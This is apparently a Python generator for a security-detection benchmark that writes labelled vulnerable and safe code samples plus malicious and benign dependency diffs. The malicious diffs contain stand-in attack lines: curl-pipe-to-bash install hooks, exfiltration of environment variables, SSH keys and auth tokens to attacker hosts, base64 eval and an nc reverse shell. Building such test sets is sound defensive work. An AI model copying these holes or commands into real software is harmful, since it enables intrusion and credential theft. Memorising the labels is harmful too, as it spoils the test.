"""Generates benchmark datasets: 20 code samples and 15 dependency diffs."""

from pathlib import Path
import json

CODE_DIR = Path("benchmark/datasets/code")
DIFF_DIR = Path("benchmark/datasets/diffs")
CODE_DIR.mkdir(parents=True, exist_ok=True)
DIFF_DIR.mkdir(parents=True, exist_ok=True)

SAMPLES = [
    # 1. SQL Injection
    ("sqli_raw_query.py", True, "INJECTION", """
import sqlite3

def get_user_profile(user_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # Vulnerable SQL format string
    query = f"SELECT username, email FROM users WHERE id = '{user_id}'"
    cursor.execute(query)
    return cursor.fetchone()
"""),

    # 2. Command Injection os.system
    ("cmd_os_system.py", True, "INJECTION", """
import os

def ping_host(target_ip):
    # Vulnerable OS command injection
    os.system(f"ping -c 1 {target_ip}")
"""),

    # 3. Command Injection subprocess shell=True
    ("cmd_subprocess_shell.py", True, "INJECTION", """
import subprocess

def compress_folder(folder_name):
    # Vulnerable subprocess shell execution
    subprocess.Popen(f"tar -czf {folder_name}.tar.gz {folder_name}", shell=True)
"""),

    # 4. Path Traversal
    ("path_traversal_open.py", True, "INJECTION", """
import os

def read_user_file(filename):
    base_dir = "/var/data/uploads/"
    # Path traversal vulnerability
    target = base_dir + filename
    with open(target, "r") as f:
        return f.read()
"""),

    # 5. SSRF
    ("ssrf_fetch_url.py", True, "SSRF", """
import requests

def preview_link(user_url):
    # SSRF vulnerability
    resp = requests.get(user_url, timeout=5)
    return resp.text[:200]
"""),

    # 6. Insecure Deserialization (pickle)
    ("deserialization_pickle.py", True, "DESERIALIZATION", """
import pickle

def load_session(serialized_data):
    # Arbitrary code execution via pickle
    session = pickle.loads(serialized_data)
    return session
"""),

    # 7. Insecure Deserialization (yaml)
    ("deserialization_yaml.py", True, "DESERIALIZATION", """
import yaml

def parse_config(raw_yaml):
    # Unsafe YAML loader
    return yaml.load(raw_yaml, Loader=yaml.Loader)
"""),

    # 8. Hardcoded AWS Key
    ("hardcoded_aws_key.py", True, "AUTH_SECRETS", """
import boto3

AWS_ACCESS_KEY_ID = "MOCK_EXPOSED_AWS_ACCESS_KEY_ID_99"
AWS_SECRET_ACCESS_KEY = "mock_exposed_aws_secret_access_key_string_99"

def init_s3():
    return boto3.client("s3", aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY)
"""),

    # 9. Hardcoded Secret Token
    ("hardcoded_secret_token.py", True, "AUTH_SECRETS", """
class Config:
    api_key = "mock_insecure_hardcoded_api_key_test_xyz123"
    jwt_secret = "super_insecure_hardcoded_jwt_secret_token_123"
"""),

    # 10. Weak Crypto MD5
    ("weak_crypto_md5.py", True, "WEAK_CRYPTO", """
import hashlib

def verify_user_password(password, stored_hash):
    # Vulnerable weak MD5 hash
    computed = hashlib.md5(password.encode()).hexdigest()
    return computed == stored_hash
"""),

    # 11. JWT None Algorithm
    ("jwt_none_alg.py", True, "AUTH_BYPASS", """
import jwt

def parse_auth_header(token):
    # Vulnerable: Accepts unsigned 'none' algorithm
    return jwt.decode(token, algorithms=["none"], verify=False)
"""),

    # 12. Dynamic Eval Calculator
    ("eval_dynamic_calc.py", True, "INJECTION", """
def calculate_expression(user_math_expr):
    # Dangerous eval usage
    return eval(user_math_expr)
"""),

    # 13. SSRF Internal Metadata
    ("ssrf_cloud_meta.py", True, "SSRF", """
import urllib.request

def fetch_instance_metadata():
    # Direct probe of cloud metadata IP
    target_url = "http://169.254.169.254/latest/meta-data/"
    return urllib.request.urlopen(target_url).read()
"""),

    # 14. Broken Access Control
    ("broken_auth_bypass.py", True, "AUTH_BYPASS", """
def admin_action(req):
    # Insecure client-side header trust
    if req.headers.get("X-Is-Admin") == "true":
        return "Admin access granted"
    return "Forbidden"
"""),

    # 15. Weak Crypto DES
    ("weak_crypto_des.py", True, "WEAK_CRYPTO", """
import hashlib

def encrypt_pin(pin):
    # Weak SHA1 for secret
    return hashlib.sha1(pin.encode()).hexdigest()
"""),

    # Benign Controls (Negative test cases)
    ("benign_parameterized_sql.py", False, "BENIGN", """
import sqlite3

def get_user_profile(user_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # Safe parameterized query
    cursor.execute("SELECT username, email FROM users WHERE id = ?", (user_id,))
    return cursor.fetchone()
"""),

    ("benign_subprocess_safe.py", False, "BENIGN", """
import subprocess

def list_files(directory):
    # Safe subprocess execution with array args and shell=False
    return subprocess.run(["ls", "-la", directory], shell=False, check=True, capture_output=True)
"""),

    ("benign_secure_hash.py", False, "BENIGN", """
import hashlib

def hash_token(token, salt):
    # Safe modern SHA-256 hash
    return hashlib.sha256(salt.encode() + token.encode()).hexdigest()
"""),

    ("benign_env_secret.py", False, "BENIGN", """
import os

def get_api_key():
    # Safe credential retrieval from environment variable
    return os.environ.get("PRODUCTION_API_KEY")
"""),

    ("benign_json_parse.py", False, "BENIGN", """
import json

def load_payload(raw_json):
    # Safe standard JSON parsing
    return json.loads(raw_json)
""")
]

DIFFS = [
    # 1. Malicious postinstall curl
    ("malicious_postinstall_curl.diff", True, "SUPPLY_CHAIN", """--- a/package.json
+++ b/package.json
@@ -12,3 +12,4 @@
   "scripts": {
     "test": "jest",
+    "postinstall": "curl -s http://attacker-c2.net/payload.sh | bash"
   }
"""),

    # 2. Malicious env exfil
    ("malicious_env_exfil.diff", True, "SUPPLY_CHAIN", """--- a/lib/analytics.js
+++ b/lib/analytics.js
@@ -15,4 +15,7 @@ function track(event) {
   // Harmless metric
   console.log("Event:", event);
+  // Exfiltrate environment variables
+  fetch("https://evil-analytics.org/telemetry", { method: "POST", body: JSON.stringify(process.env) });
 }
"""),

    # 3. Malicious obfuscated eval
    ("malicious_obfuscated_eval.diff", True, "OBFUSCATION", """--- a/index.js
+++ b/index.js
@@ -4,3 +4,5 @@ module.exports = function(opts) {
   return opts.enabled ? true : false;
+  // Hidden evaluated payload
+  eval(Buffer.from("ZXZhbCgncG9zdGluc3RhbGwnKQ==", "base64").toString());
 };
"""),

    # 4. Malicious setup.py install hook
    ("malicious_setup_py_hook.diff", True, "SUPPLY_CHAIN", """--- a/setup.py
+++ b/setup.py
@@ -10,3 +10,6 @@ setup(
     name="cool-helper",
     version="1.0.1",
+    # Suspicious install hook
+    cmdclass={'install': lambda: os.system("curl -s http://198.51.100.2/hook | python3")}
 )
"""),

    # 5. Malicious SSH key stealer
    ("malicious_ssh_stealer.diff", True, "SUPPLY_CHAIN", """--- a/src/net.py
+++ b/src/net.py
@@ -20,3 +20,6 @@ def connect():
+    # Reading ssh keys
+    with open(os.path.expanduser("~/.ssh/id_rsa"), "r") as f:
+        requests.post("http://exfil.attacker.com/leak", data=f.read())
"""),

    # 6. Malicious credential harvester
    ("malicious_cred_harvester.diff", True, "SUPPLY_CHAIN", """--- a/lib/http-client.js
+++ b/lib/http-client.js
@@ -12,3 +12,7 @@ function sendRequest(req) {
+  // Sniff authorization tokens
+  if (req.headers && req.headers['authorization']) {
+    fetch("https://c2.logger.io/sniff", { method: "POST", body: req.headers['authorization'] });
+  }
"""),

    # 7. Malicious reverse shell
    ("malicious_reverse_shell.diff", True, "SUPPLY_CHAIN", """--- a/bin/cli.js
+++ b/bin/cli.js
@@ -1,3 +1,5 @@
 #!/usr/bin/env node
+const { exec } = require('child_process');
+exec('nc -e /bin/sh 198.51.100.1 4444');
 run();
"""),

    # Benign dependency updates
    ("benign_patch_version.diff", False, "BENIGN", """--- a/package.json
+++ b/package.json
@@ -8,3 +8,3 @@
   "dependencies": {
-    "lodash": "^4.17.20"
+    "lodash": "^4.17.21"
   }
"""),

    ("benign_docs_typo.diff", False, "BENIGN", """--- a/README.md
+++ b/README.md
@@ -1,3 +1,3 @@
-# Setinel Security
+# Sentinel Security
 An open-weight security platform.
"""),

    ("benign_refactor_pure.diff", False, "BENIGN", """--- a/math.js
+++ b/math.js
@@ -3,5 +3,3 @@ function clamp(val, min, max) {
-  if (val < min) return min;
-  if (val > max) return max;
-  return val;
+  return Math.min(Math.max(val, min), max);
 }
"""),

    ("benign_added_unit_test.diff", False, "BENIGN", """--- a/tests/test_date.py
+++ b/tests/test_date.py
@@ -10,3 +10,6 @@ def test_format_iso():
     assert format_date("2026-10-26") == "26 Oct 2026"
+
+def test_format_empty():
+    assert format_date("") == ""
"""),

    ("benign_add_dev_dependency.diff", False, "BENIGN", """--- a/package.json
+++ b/package.json
@@ -20,3 +20,4 @@
   "devDependencies": {
+    "eslint": "^9.0.0",
     "jest": "^29.0.0"
   }
"""),

    ("benign_css_update.diff", False, "BENIGN", """--- a/styles.css
+++ b/styles.css
@@ -14,3 +14,3 @@ .btn-primary {
-  background-color: #0070f3;
+  background-color: #0060df;
   border-radius: 6px;
"""),

    ("benign_python_type_hint.diff", False, "BENIGN", """--- a/parser.py
+++ b/parser.py
@@ -1,3 +1,4 @@
+from typing import Optional
 
-def parse_token(raw):
+def parse_token(raw: str) -> Optional[dict]:
     if not raw: return None
"""),

    ("benign_ci_matrix_bump.diff", False, "BENIGN", """--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -12,3 +12,3 @@ jobs:
       matrix:
-        python-version: ["3.10", "3.11"]
+        python-version: ["3.10", "3.11", "3.12", "3.13"]
""")
]

manifest = {"code_samples": [], "diff_samples": []}

for filename, is_vuln, category, content in SAMPLES:
    path = CODE_DIR / filename
    with open(path, "w", encoding="utf-8") as f:
        f.write(content.strip() + "\n")
    manifest["code_samples"].append({
        "file": str(path),
        "is_vulnerable": is_vuln,
        "category": category
    })

for filename, is_vuln, category, content in DIFFS:
    path = DIFF_DIR / filename
    with open(path, "w", encoding="utf-8") as f:
        f.write(content.strip() + "\n")
    manifest["diff_samples"].append({
        "file": str(path),
        "is_vulnerable": is_vuln,
        "category": category
    })

with open("benchmark/manifest.json", "w", encoding="utf-8") as f:
    json.dump(manifest, f, indent=2)

print(f"Generated {len(SAMPLES)} code samples and {len(DIFFS)} diffs in benchmark/datasets/.")
